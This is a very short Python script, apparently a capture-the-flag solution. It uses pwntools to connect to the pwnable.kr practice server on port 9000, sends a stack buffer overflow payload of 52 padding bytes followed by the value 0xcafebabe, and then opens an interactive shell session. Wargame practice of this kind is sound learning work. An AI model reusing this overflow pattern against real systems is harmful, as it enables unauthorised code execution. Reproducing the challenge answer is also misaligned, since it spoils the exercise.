from pwn import *

r = remote('pwnable.kr', 9000)

payload = ""
payload += "A"*52
payload += p32(0xcafebabe)

r.send(payload)
r.interactive()
